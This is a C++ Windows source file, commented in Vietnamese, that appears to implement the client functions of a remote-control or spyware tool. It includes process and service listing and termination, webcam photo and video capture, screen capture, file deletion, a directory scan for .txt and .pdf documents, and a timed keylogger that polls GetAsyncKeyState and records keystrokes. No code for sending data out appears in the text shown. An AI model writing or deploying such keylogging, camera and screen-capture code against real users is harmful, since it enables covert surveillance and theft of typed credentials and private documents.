#include <windows.h>
#include <iostream>
#include <sstream>
#include <tchar.h>
#include <opencv2/core.hpp>
#include <opencv2/highgui.hpp>
#include <opencv2/imgproc.hpp>
#include <map>
#include <windows.h>
#include <gdiplus.h>
#include <iostream>
#include <chrono>
#include <cstdio>
#include <string>
#include <unordered_map>
#include <cstdlib>
#include <filesystem>
#include <locale>
#include <random>
#include <algorithm>
#include <tlhelp32.h>
#include <wbemidl.h>
#include <comdef.h>
#include <numeric>
#include <opencv2/core/utils/logger.hpp>
#pragma comment (lib,"Gdiplus.lib")
#pragma comment(lib, "wbemuuid.lib")

using namespace std;
using namespace cv;
namespace fs = std::filesystem;

std::wstringstream activeAppTitlesStream;
std::map<std::wstring, DWORD> windowTitlesAndPIDs;

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    if (IsWindowVisible(hwnd)) {
        TCHAR windowTitle[256];
        GetWindowText(hwnd, windowTitle, sizeof(windowTitle) / sizeof(TCHAR));
        if (_tcslen(windowTitle) > 0) {
            DWORD pid;
            GetWindowThreadProcessId(hwnd, &pid);  // Lấy PID của cửa sổ
            activeAppTitlesStream << windowTitle << L" (PID: " << pid << L")\n";
            windowTitlesAndPIDs[windowTitle] = pid; // Lưu tiêu đề và PID vào map
        }
    }
    return TRUE;
}

std::wstring ListRunningApplications() {
    activeAppTitlesStream.str(L"");  // Xóa nội dung cũ
    windowTitlesAndPIDs.clear();     // Xóa map cũ
    EnumWindows(EnumWindowsProc, 0);

    std::wstring appList;
    int count = 1;  // Số thứ tự

    // Liệt kê tất cả các ứng dụng
    for (const auto& entry : windowTitlesAndPIDs) {
        DWORD pid = entry.second;
        if (pid > 0) { // Chỉ lấy các ứng dụng thực sự đang chạy
            appList += std::to_wstring(count) + L". " + entry.first + L" (PID: " + std::to_wstring(pid) + L")\n";
            count++;
        }
    }

    // Nếu không tìm thấy ứng dụng nào, hiển thị thông báo
    if (appList.empty()) {
        appList = L"No running applications found.\n";
    }
    return appList;
}

std::wstring ListServices() {
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!scm) {
        return L"Failed to open Service Control Manager";
    }

    DWORD bytesNeeded = 0, servicesCount = 0;
    EnumServicesStatus(scm, SERVICE_WIN32, SERVICE_ACTIVE, NULL, 0, &bytesNeeded, &servicesCount, NULL);
    std::vector<BYTE> buffer(bytesNeeded);
    LPENUM_SERVICE_STATUS services = (LPENUM_SERVICE_STATUS)buffer.data();

    if (!EnumServicesStatus(scm, SERVICE_WIN32, SERVICE_ACTIVE, services, bytesNeeded, &bytesNeeded, &servicesCount, NULL)) {
        CloseServiceHandle(scm);
        return L"Failed to enumerate services";
    }

    // Tạo vector chứa các chỉ số từ 0 đến servicesCount-1
    std::vector<int> indices(servicesCount);
    std::iota(indices.begin(), indices.end(), 0);

    // Tạo random engine và shuffle vector indices
    std::random_device rd;
    std::mt19937 gen(rd());
    std::shuffle(indices.begin(), indices.end(), gen);

    // Lấy 15 services ngẫu nhiên
    std::wstring serviceList;
    int maxServicesToShow = std::min<int>(15, servicesCount);

    for (int i = 0; i < maxServicesToShow; i++) {
        int idx = indices[i];
        serviceList += std::to_wstring(i + 1) + L". " +
            services[idx].lpServiceName + L" - " +
            services[idx].lpDisplayName + L"\n";
    }

    CloseServiceHandle(scm);

    if (serviceList.empty()) {
        serviceList = L"No running services found.\n";
    }

    return serviceList;
}

std::wstring ListOffServices() {
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!scm) {
        return L"Failed to open Service Control Manager";
    }

    DWORD bytesNeeded = 0, servicesCount = 0;
    EnumServicesStatus(scm, SERVICE_WIN32, SERVICE_INACTIVE, NULL, 0, &bytesNeeded, &servicesCount, NULL);
    std::vector<BYTE> buffer(bytesNeeded);
    LPENUM_SERVICE_STATUS services = (LPENUM_SERVICE_STATUS)buffer.data();

    if (!EnumServicesStatus(scm, SERVICE_WIN32, SERVICE_INACTIVE, services, bytesNeeded, &bytesNeeded, &servicesCount, NULL)) {
        CloseServiceHandle(scm);
        return L"Failed to enumerate services";
    }

    std::wstring serviceList;

    // Tạo vector chứa các chỉ số từ 0 đến servicesCount - 1
    std::vector<int> indices(servicesCount);
    std::iota(indices.begin(), indices.end(), 0);

    // Shuffle nếu số lượng services vượt quá 15
    if (servicesCount > 15) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::shuffle(indices.begin(), indices.end(), gen);
    }

    int maxServicesToShow = std::min<int>(15, servicesCount);
    for (int i = 0; i < maxServicesToShow; i++) {
        int idx = indices[i];
        serviceList += std::to_wstring(i + 1) + L". " +
            services[idx].lpServiceName + L" - " +
            services[idx].lpDisplayName + L"\n";
    }

    CloseServiceHandle(scm);

    if (serviceList.empty()) {
        serviceList = L"No inactive services found.\n";
    }

    return serviceList;
}

std::string wstringToString(const std::wstring& wstr) {
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string str(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &str[0], size_needed, NULL, NULL);
    return str;
}

bool stopApplicationByPID(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProcess == NULL) {
        std::cerr << "Failed to open process with PID: " << pid << std::endl;
        return false;
    }

    if (!TerminateProcess(hProcess, 0)) {
        std::cerr << "Failed to terminate process with PID: " << pid << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    CloseHandle(hProcess);
    return true;
}

bool startService(const std::wstring& serviceName) {
    if (serviceName.empty()) {
        std::cerr << "No service name provided!" << std::endl;
        return false;
    }

    // Mở Service Control Manager
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) {
        std::cerr << "Failed to open Service Control Manager." << std::endl;
        std::cerr << "Error code: " << GetLastError() << std::endl; // Ghi mã lỗi
        return false;
    }

    // Mở handle tới service
    SC_HANDLE hService = OpenService(hSCManager, serviceName.c_str(), SERVICE_START | SERVICE_QUERY_STATUS);
    if (!hService) {
        std::wcerr << L"Failed to open service: " << serviceName << std::endl;
        std::cerr << "Error code: " << GetLastError() << std::endl; // Ghi mã lỗi
        CloseServiceHandle(hSCManager);
        return false;
    }

    // Kiểm tra trạng thái hiện tại của service
    SERVICE_STATUS_PROCESS ssp = {};
    DWORD bytesNeeded = 0;
    if (!QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded)) {
        std::cerr << "Failed to query service status." << std::endl;
        std::cerr << "Error code: " << GetLastError() << std::endl; // Ghi mã lỗi
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return false;
    }

    // Kiểm tra trạng thái hiện tại
    if (ssp.dwCurrentState == SERVICE_RUNNING) {
        std::wcout << L"The service is already running: " << serviceName << std::endl;
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return true;
    }

    if (ssp.dwCurrentState == SERVICE_STOP_PENDING) {
        std::wcerr << L"The service is stopping and cannot be started: " << serviceName << std::endl;
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return false;
    }

    // Gửi lệnh khởi động service
    if (!StartService(hService, 0, NULL)) {
        std::wcerr << L"Failed to start service: " << serviceName << std::endl;
        std::cerr << "Error code: " << GetLastError() << std::endl; // Ghi mã lỗi
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return false;
    }

    std::wcout << L"Service " << serviceName << L" started successfully." << std::endl;

    // Đóng handle
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return true;
}


bool stopService(const std::wstring& serviceName) {
    if (serviceName.empty()) {
        std::cerr << "No service found !" << std::endl;
        return false;
    }

    // Mở Service Control Manager
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) {
        std::cerr << "Failed to open Service Control Manager." << std::endl;
        std::cerr << "Error code: " << GetLastError() << std::endl; // Ghi mã lỗi
        return false;
    }

    // Mở handle tới service
    SC_HANDLE hService = OpenService(hSCManager, serviceName.c_str(), SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (!hService) {
        std::wcerr << L"Failed to open service: " << serviceName << std::endl;
        std::cerr << "Error code: " << GetLastError() << std::endl; // Ghi mã lỗi
        CloseServiceHandle(hSCManager);
        return false;
    }

    // Kiểm tra trạng thái hiện tại của service
    SERVICE_STATUS_PROCESS ssp = {};
    DWORD bytesNeeded = 0;
    if (!QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded)) {
        std::cerr << "Failed to query service status." << std::endl;
        std::cerr << "Error code: " << GetLastError() << std::endl; // Ghi mã lỗi
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return false;
    }

    // Kiểm tra xem service có chấp nhận lệnh STOP không
    if (!(ssp.dwControlsAccepted & SERVICE_ACCEPT_STOP)) {
        std::wcerr << L"The service does not accept STOP control: " << serviceName << std::endl;
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return false;
    }

    // Kiểm tra trạng thái hiện tại
    if (ssp.dwCurrentState == SERVICE_STOPPED) {
        std::wcout << L"The service is already stopped: " << serviceName << std::endl;
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return true;
    }

    if (ssp.dwCurrentState == SERVICE_START_PENDING) {
        std::wcerr << L"The service is starting and cannot be stopped: " << serviceName << std::endl;
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return false;
    }

    // Gửi lệnh dừng service
    SERVICE_STATUS serviceStatus = {};
    if (!ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus)) {
        std::wcerr << L"Failed to stop service: " << serviceName << std::endl;
        std::cerr << "Error code: " << GetLastError() << std::endl; // Ghi mã lỗi
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return false;
    }

    std::wcout << L"Service " << serviceName << L" stopped successfully." << std::endl;

    // Đóng handle
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return true;
}

bool imageCapture() {
    // Tắt log của OpenCV
    cv::utils::logging::setLogLevel(cv::utils::logging::LOG_LEVEL_SILENT);

    VideoCapture cap(0); // Mở camera mặc định
    if (!cap.isOpened()) {
        std::cerr << "Cannot open camera!" << std::endl;
        return false;
    }

    Mat frame;
    cap >> frame; // Chụp ảnh
    if (frame.empty()) {
        std::cerr << "Captured frame is empty!" << std::endl;
        return false;
    }

    // Đặt tên tệp và định dạng
    std::string filePath = "Anhchuptucamera.jpg";

    // Ghi ảnh vào tệp
    if (!imwrite(filePath, frame)) {
        std::cerr << "Failed to save the image!" << std::endl;
        return false;
    }

    cap.release(); // Giải phóng camera
    std::cout << "Image captured and saved successfully at " << filePath << std::endl;
    return true;
}

bool videoCapture() {
    // Tắt log OpenCV
    cv::utils::logging::setLogLevel(cv::utils::logging::LOG_LEVEL_SILENT);

    VideoCapture cap(0); // Mở camera mặc định
    if (!cap.isOpened()) {
        std::cerr << "Cannot open camera!" << std::endl;
        return false;
    }

    // Lấy thông tin về độ phân giải và FPS của camera
    int frameWidth = static_cast<int>(cap.get(CAP_PROP_FRAME_WIDTH));
    int frameHeight = static_cast<int>(cap.get(CAP_PROP_FRAME_HEIGHT));
    int fps = 30; // Số khung hình trên giây (có thể thay đổi nếu cần)

    // Tên và định dạng file video
    std::string filePath = "Clipquaytucamera.mp4";

    // Tạo đối tượng VideoWriter để lưu video
    VideoWriter writer(filePath, VideoWriter::fourcc('X', '2', '6', '4'), fps, Size(frameWidth, frameHeight));
    if (!writer.isOpened()) {
        std::cerr << "Failed to open video file for writing!" << std::endl;
        return false;
    }

    std::cout << "Recording video for 4 seconds..." << std::endl;

    Mat frame;
    int frameCount = 0;
    int totalFrames = fps * 4; // Tổng số khung hình cho 4 giây

    // Ghi khung hình từ camera trong vòng 4 giây
    while (frameCount < totalFrames) {
        cap >> frame; // Lấy một khung hình
        if (frame.empty()) {
            std::cerr << "Captured frame is empty!" << std::endl;
            break;
        }
        writer.write(frame); // Ghi khung hình vào file video
        frameCount++;
    }

    cap.release();    // Giải phóng camera
    writer.release(); // Giải phóng VideoWriter
    std::cout << "Video recorded and saved successfully at " << filePath << std::endl;
    return true;
}


void CaptureScreen(const wchar_t* filename) {
    // Khởi tạo GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // Lấy kích thước màn hình
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    // Tạo đối tượng bitmap để lưu ảnh chụp
    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, screenWidth, screenHeight);
    SelectObject(hDC, hBitmap);

    // Sao chép màn hình vào bitmap
    BitBlt(hDC, 0, 0, screenWidth, screenHeight, hScreen, 0, 0, SRCCOPY);

    // Lưu ảnh chụp vào file
    Gdiplus::Bitmap bitmap(hBitmap, NULL);
    CLSID clsid;
    CLSIDFromString(L"{557CF406-1A04-11D3-9A73-0000F81EF32E}", &clsid);  // CLSID cho định dạng PNG
    bitmap.Save(filename, &clsid, NULL);

    //// Giải phóng tài nguyên
    //DeleteObject(hBitmap);
    //DeleteDC(hDC);
    //ReleaseDC(NULL, hScreen);

    //Gdiplus::GdiplusShutdown(gdiplusToken);
}

bool startApplication(const std::wstring& appPath) {
    if (!appPath.empty()) {
        HINSTANCE result = ShellExecute(NULL, L"open", appPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
        if ((intptr_t)result > 32) {
            return true;
        }
        else {
            std::cerr << "Failed to start application: " << wstringToString(appPath) << std::endl;
            return false;
        }
    }
    else {
        std::cerr << "No application path provided" << wstringToString(appPath) << std::endl;
        return false;
    }
    return true;
}

std::atomic<bool> keyloggerRunning(false);
std::wstring keylogResult;
std::mutex keylogMutex;

// Hàm chuyển mã phím thành ký tự
wchar_t ConvertKeyToChar(int key) {
    if (key >= 32 && key <= 126) { // Printable ASCII characters
        return static_cast<wchar_t>(key);
    }
    return L'\0';
}

// Luồng thực thi keylogger
void KeyloggerThread() {
    keylogResult.clear(); // Xóa kết quả cũ
    auto startTime = std::chrono::high_resolution_clock::now();
    auto endTime = startTime + std::chrono::seconds(5);

    while (keyloggerRunning) {
        auto currentTime = std::chrono::high_resolution_clock::now();
        if (currentTime >= endTime) {
            keyloggerRunning = false;
            break;
        }

        for (int i = 0; i < 256; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                wchar_t keyChar = ConvertKeyToChar(i);
                if (keyChar != L'\0') {
                    std::lock_guard<std::mutex> lock(keylogMutex);
                    keylogResult += keyChar;
                }
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(80));
    }
}

// Hàm khởi chạy keylogger
std::wstring StartKeylogger() {
    if (keyloggerRunning) {
        return L"Keylogger is already running!";
    }

    keyloggerRunning = true;
    std::thread loggerThread(KeyloggerThread);

    if (loggerThread.joinable()) {
        loggerThread.join();
    }

    std::lock_guard<std::mutex> lock(keylogMutex);
    return keylogResult.empty() ? L"No keys pressed during the session." : keylogResult;
}

// Hàm để lấy MIME type từ phần mở rộng
std::string getMimeType(const std::string& extension) {
    static const std::unordered_map<std::string, std::string> mimeTypes = {
        {"txt", "text/plain"},
        {"pdf", "application/pdf"},
        {"jpg", "image/jpeg"},
        {"jpeg", "image/jpeg"},
        {"png", "image/png"},
        {"gif", "image/gif"},
        {"html", "text/html"},
        {"csv", "text/csv"},
        {"json", "application/json"},
        {"xml", "application/xml"},
        {"zip", "application/zip"},
        {"mp3", "audio/mpeg"},
        {"mp4", "video/mp4"}
        // Thêm MIME types khác nếu cần
    };

    auto it = mimeTypes.find(extension);
    if (it != mimeTypes.end()) {
        return it->second;
    }
    return "application/octet-stream"; // MIME mặc định nếu không xác định được
}
bool deleteFile(string filename) {
    if (std::remove(filename.c_str()) == 0) {
        return true;
    }
    else {
        return false;
    }
}

// Hàm kiểm tra thư mục hoặc file có chứa các file mục tiêu
bool containsTargetFiles(const fs::path& path) {
    try {
        for (const auto& entry : fs::directory_iterator(path)) {
            if (entry.is_regular_file()) {
                std::string extension = entry.path().extension().string();
                if (extension == ".txt" || extension == ".pdf") {
                    return true;
                }
            }
            else if (entry.is_directory()) {
                if (containsTargetFiles(entry.path())) {
                    return true;
                }
            }
        }
    }
    catch (const std::exception&) {
        // Bỏ qua lỗi
    }
    return false;
}

// Hàm kiểm tra chuỗi có chứa ký tự không phải ASCII
bool isASCII(const std::wstring& str) {
    for (wchar_t ch : str) {
        if (ch > 127) {
            return false;
        }
    }
    return true;
}

// Hàm kiểm tra folder và file con có ký tự không phải ASCII
bool containsNonASCII(const fs::path& path) {
    try {
        for (const auto& entry : fs::directory_iterator(path)) {
            std::wstring name = entry.path().filename().wstring();
            if (!isASCII(name)) {
                return true;
            }
        }
    }
    catch (const std::exception&) {
        // Bỏ qua lỗi
    }
    return false;
}

// Hàm in cây thư mục chỉ chứa file .txt hoặc .pdf và không có ký tự không phải ASCII
std::wstring TreeFolder(const std::wstring& path, const std::wstring& indent = L"") {
    std::wostringstream result;

    try {
        if (!fs::exists(path) || !fs::is_directory(path)) {
            return L"Invalid or non-existent directory path.";
        }

        for (const auto& entry : fs::directory_iterator(path)) {
            std::wstring name = entry.path().filename().wstring();

            // Bỏ qua folder hoặc file có ký tự không phải ASCII
            if (!isASCII(name)) {
                continue;
            }

            if (entry.is_directory()) {
                // Bỏ qua toàn bộ folder nếu chứa file/folder con có ký tự không phải ASCII
                if (containsNonASCII(entry.path())) {
                    continue;
                }
                if (containsTargetFiles(entry.path())) {
                    result << indent << L"[Folder] " << name << L"\n";
                    result << TreeFolder(entry.path().wstring(), indent + L"    ");
                }
            }
            else if (entry.is_regular_file()) {
                std::string extension = entry.path().extension().string();
                if (extension == ".txt" || extension == ".pdf") {
                    result << indent << L"- " << name << L"\n";
                }
            }
        }
    }
    catch (const std::exception&) {
        // Bỏ qua lỗi
    }

    return result.str();
}